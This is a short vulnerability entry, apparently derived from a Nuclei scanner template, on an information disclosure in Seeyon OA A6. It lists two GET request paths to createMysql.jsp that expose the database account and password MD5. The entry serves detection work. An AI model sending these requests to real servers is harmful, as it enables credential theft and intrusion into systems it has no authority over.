# Vulnerability: Seeyon OA A6 createMysql.jsp Database - Information Disclosure
**Classification:** SEEYON
**Source:** Nuclei Template (`seeyon-createmysql-exposure.yaml`)

## Description
Seeyon OA A6 has leaked sensitive database information. An attacker can obtain the database account and password MD5 by accessing a specific URL.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/yyoa/createMysql.jsp
GET {{BaseURL}}/yyoa/ext/createMysql.jsp
```

